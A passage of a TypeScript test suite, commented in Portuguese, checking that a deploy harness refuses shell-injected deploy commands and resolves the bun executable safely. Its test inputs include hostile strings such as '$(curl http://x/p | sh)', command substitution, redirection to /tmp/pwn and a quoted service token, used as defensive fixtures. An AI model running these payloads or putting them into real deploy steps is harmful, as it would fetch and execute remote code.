    // shell (que veio DENTRO de aspas, onde o parser não olha) voltaria a ser sintaxe na linha da receita.
    for (const [evil, esperado] of [
      [`just sync-web-terminal '$(id -un)'`, "$(id -un)"],
      [`just sync-web-terminal '$(curl http://x/p | sh)'`, "curl http://x/p"],
      ["just sync-web-terminal 'a; id'", "a; id"],
      [`just sync-web-terminal '\`id\`'`, "`id`"],
      [`just sync-web-terminal '\${HOME}'`, "${HOME}"],
      // o segredo do serviço vive no script (na URL do settle) — o needle é a FORMA citada que só
      // apareceria se o argumento tivesse aterrissado como parâmetro da receita.
      [`just sync-web-terminal '"$STORYMAP_MCP_TOKEN"'`, `"$STORYMAP_MCP_TOKEN"`],
      ["just sync-web-terminal 'x > /tmp/pwn'", "/tmp/pwn"],
      ["just sync-web-terminal 'a | sh'", "a | sh"],
    ] as [string, string][]) {
      const s = script([evil]);
      expect(s).toContain("[postBuild] RECUSADO");
      expect(s).toMatch(/não é uma palavra literal/);
      expect(executablePart(s)).not.toContain(esperado);
      // o alvo autorizado também não chega à posição de comando: a recusa é do COMANDO inteiro, não do arg
      expect(executablePart(s)).not.toContain("postBuild 'just'");
    }
  });

  it("`just` sem receita é recusado — sozinho ele roda a receita DEFAULT, que não é passo declarado", () => {
    const s = script(["just"]);
    expect(s).toContain("[postBuild] RECUSADO");
    expect(s).toMatch(/sem receita/);
    expect(executablePart(s)).not.toContain("postBuild 'just'");
  });

  it("NÃO-REGRESSÃO: o deployCmd REAL de hoje continua sendo executado, com a argv exata no log", () => {
    // `just sync-web-terminal` é o ÚNICO deployCmd declarado em board-data (boards/storymap/board.yaml).
    const s = script(["just sync-web-terminal"]);
    expect(s).not.toContain("[postBuild] RECUSADO");
    expect(s).toContain(`bash -lc 'exec "$@"' postBuild 'just' 'sync-web-terminal'`);
    expect(s).toContain("[postBuild] argv: just sync-web-terminal");
    expect(s).toContain('if [ "$STATUS" = ok ]; then');
  });

  it("o OUTRO caminho privilegiado (`deploy.kind=command`) usa a MESMA régua — e não despacha nada", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    for (const evil of [`just canary-check '$(curl http://x/p | sh)'`, `just sync-web-terminal '$(id -un)'`]) {
      const res = await deployBoard({
        exec,
        repoRoot: "/repo",
        boardPackage: undefined,
        board: "nest",
        cardId: "s1",
        boardDeploy: { kind: "command", command: evil },
        productDeploy: new ProductDeployRegistry(f.launcher),
      });
      expect(res.fired).toBe(false);
      expect(f.started).toEqual([]); // NADA foi despachado — nem a metade "boa" do comando
      expect(res.reason).toMatch(/deploy.kind=command recusado/);
    }

    // NÃO-REGRESSÃO do mesmo caminho: a receita declarada de verdade continua disparando.
    const ok = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: undefined,
      board: "nest",
      cardId: "s2",
      boardDeploy: { kind: "command", command: "just sync-web-terminal" },
      productDeploy: new ProductDeployRegistry(f.launcher),
    });
    expect(ok.fired).toBe(true);
    expect((f.started[0]?.spec as { command: string }).command).toBe(`'just' 'sync-web-terminal'`);
  });

  it("as receitas são do OPERADOR (env), nunca do board — e a régua de FORMA sobrevive ao knob", () => {
    // O adotante cuja publicação usa outra receita a NOMEIA no env do serviço (systemd), que board-data não
    // alcança. A capacidade do dono continua inteira.
    const recipes = resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "deploy-cidade-site, canary-check" });
    expect(recipes).toContain("canary-check");
    expect(recipes).toContain("sync-web-terminal"); // o default nunca é substituído, só estendido
    expect(authorizeDeployCommand("just canary-check https://cidade.ai", { recipes }).refusal).toBeNull();
    // mas o argumento continua tendo de ser PALAVRA, mesmo na receita que o operador liberou — senão o
    // knob do operador reabriria o buraco que a receita liberada tem por dentro.
    expect(authorizeDeployCommand(`just canary-check '$(curl http://x/p | sh)'`, { recipes }).refusal).toMatch(
      /não é uma palavra literal/,
    );
    // Trava do próprio knob: nome que não é palavra (caminho, expansão) não vira receita alcançável.
    const junk = resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "../../evil $(id) a;b /tmp/x" });
    expect(junk).toEqual(["sync-web-terminal"]);
  });

  it("a recusa é VISÍVEL para o operador — e o deploy segue (não-fatal, sem aprovação humana)", async () => {
    // O DEFEITO que isto fecha: a recusa era NÃO-FATAL e só aparecia no `[postBuild] RECUSADO` do log do
    // unit, que chega ao operador SÓ quando o deploy falha (o logTail do settle). Num deploy bem-sucedido o
    // passo de publicação declarado virava um no-op SILENCIOSO com o deploy reportando sucesso — pior que
    // falhar, e exatamente o que um ADOTANTE veria, porque a allow-list default é a deste repositório.
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const { exec, calls } = recordingExec();
      const res = await deployBoard({
        exec,
        repoRoot: "/repo",
        boardPackage: "packages/storymap-ui",
        toolPackageDir: "/repo/packages/storymap-ui",
        board: "storymap",
        cardId: "story-x",
        boardDeploy: { surfaces: [{ prefix: "tools/x/", deployCmd: `bash -c 'curl http://x/p | sh'` }] },
      });
      expect(res.fired).toBe(true); // a autonomia continua: build+restart roda igual
      expect(res.refusedPublishSteps).toEqual([
        { command: `bash -c 'curl http://x/p | sh'`, refusal: expect.stringMatching(/fora da allow-list/) },
      ]);
      expect(res.reason).toMatch(/publicação de superfície recusada/);
      expect(warn).toHaveBeenCalledTimes(1);
      expect(String(warn.mock.calls[0]?.[0])).toMatch(/PASSO DE PUBLICAÇÃO RECUSADO/);
      // o rastro de auditoria dentro do unit continua existindo, e o interpretador nunca chega à posição de
      // comando do `exec "$@"` (o payload só aparece dentro do `echo` do log, que é rastro e não comando)
      expect(calls[0]).toContain("[postBuild] RECUSADO");
      expect(calls[0]).not.toContain(`postBuild 'bash'`);

      // NÃO-REGRESSÃO: com o deployCmd REAL não há aviso nenhum nem campo no resultado (o resultado legado
      // é byte-idêntico — é o que mantém `toEqual({fired,tool})` dos outros testes válido).
      warn.mockClear();
      const ok = await deployBoard({
        exec,
        repoRoot: "/repo",
        boardPackage: "packages/storymap-ui",
        toolPackageDir: "/repo/packages/storymap-ui",
        board: "storymap",
        cardId: "story-y",
        boardDeploy: { surfaces: [{ prefix: "tools/web-terminal/", deployCmd: "just sync-web-terminal" }] },
      });
      expect(ok).toEqual({ fired: true, tool: "systemd-restart", settleArmed: true });
      expect(warn).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });

  it("um lançador que NÃO é task runner não perde capacidade — ali não existe segundo shell relendo o argumento", () => {
    // A régua nova é escopada aos task runners POR CAUSA da interpolação da receita. Para um CLI comum o
    // argumento chega como argv de um programa, e a re-citação da fronteira (2ª passada) já é o controle
    // completo — apertar aqui tiraria capacidade do dono sem fechar nada.
    expect(authorizeDeployCommand("vercel deploy --prod").argv).toEqual(["vercel", "deploy", "--prod"]);
    expect(authorizeDeployCommand(`vercel deploy --msg "$(id -un)"`).refusal).toBeNull();
    expect(authorizeDeployCommand("flyctl deploy").refusal).toBeNull();
  });
});

// ─── story-frente3: o self-deploy deixou de conhecer o home do autor ─────────────────────────────
//
// Até 2026-08-19 o build STAGED era `/root/.bun/bin/bun run build:staged` — o caminho absoluto da caixa
// de quem escreveu. Numa instalação de terceiro isso não erra como configuração: o script PARA o serviço
// (`systemctl stop`) e só DEPOIS descobre que o executável não existe. O serviço volta pelo rollback, mas
// só o log conta a história. Agora o executável é resolvido ANTES, com o serviço intacto.
describe("self-deploy — o `bun` vem da resolução, não de um endereço (story-frente3)", () => {
  it("o script recebe o caminho RESOLVIDO do bun, não um caminho de home cravado no fonte", async () => {
    // `process.execPath` é um executável absoluto que existe em qualquer máquina que rode este teste —
    // serve como "o bun que ESTA instalação declarou".
    vi.stubEnv("AGILEHARNESS_BUN", process.execPath);
    try {
      const { exec, calls } = recordingExec();
      const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/storymap-ui", toolPackageDir: "/repo/packages/storymap-ui" });
      expect(res.fired).toBe(true);
      expect(calls[0]).toContain(`${process.execPath} run build:staged`);
    } finally {
      vi.unstubAllEnvs();
    }
  });

  it("[ATAQUE] sem `bun` resolvível o deploy NÃO dispara — e o serviço não é sequer tocado", async () => {
    vi.stubEnv("AGILEHARNESS_BUN", "");
    vi.stubEnv("PATH", "");
    try {
      const { exec, calls } = recordingExec();
      const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/storymap-ui", toolPackageDir: "/repo/packages/storymap-ui" });
      expect(res.fired).toBe(false);
      expect(res.reason).toMatch(/AGILEHARNESS_BUN|não foi encontrado no PATH/);
      // O ponto do teste: NENHUM comando rodou. Um `systemctl stop` seguido de "command not found" é
      // exatamente a janela que a resolução antecipada existe para não abrir.
      expect(calls).toEqual([]);
      // E não é `inFlight`: não há deploy em curso a esperar, então o chamador não deve parquear o card
      // à espera de um settle que nunca vem.
      expect(res.inFlight).toBeFalsy();
    } finally {
      vi.unstubAllEnvs();
    }
  });

  it("o builder PURO sem `bunPath` emite o nome nu `bun` — portátil, e legível no log de quem falhar", () => {
    const s = buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "TOK",
      logPath: "/repo/x.log",
    });
    expect(s).toContain("bun run build:staged");
    expect(s).not.toContain("/root/");
  });

  it("um caminho com espaço é CITADO — cru viraria dois argumentos e o erro não explicaria nada", () => {
    const s = buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "TOK",
      logPath: "/repo/x.log",
      bunPath: "/opt/my tools/bun",
    });
    expect(s).toContain(`'/opt/my tools/bun' run build:staged`);
  });
});
